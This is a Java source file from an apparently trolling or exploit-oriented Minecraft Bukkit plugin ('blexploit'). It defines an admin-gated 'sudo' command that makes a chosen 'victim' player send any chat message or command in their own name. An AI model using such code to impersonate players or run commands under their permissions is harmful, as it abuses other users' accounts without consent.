package de.blexploit.command.cmds;

import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.create.MittrollerEntity;

public final class Sudo extends Command {

	public Sudo() {
		super("sudo", "Führt bei einem Spieler Befehle aus", TabManager.INSERT_PLAYERNAME, "Befehl");
		this.setNeedAdmin(true);
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length > 2) {
			Player victim = api.Get.victim(args, 0);
			if (victim != null) {
				String cmd = api.Get.nextArgs(args, 1);
				victim.chat(cmd);
			} else {
				mt.fehler(Fehler.PLAYER_NOT_FOUND);
				mt.benutze(this);
			}
		} else {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		}
	}
}
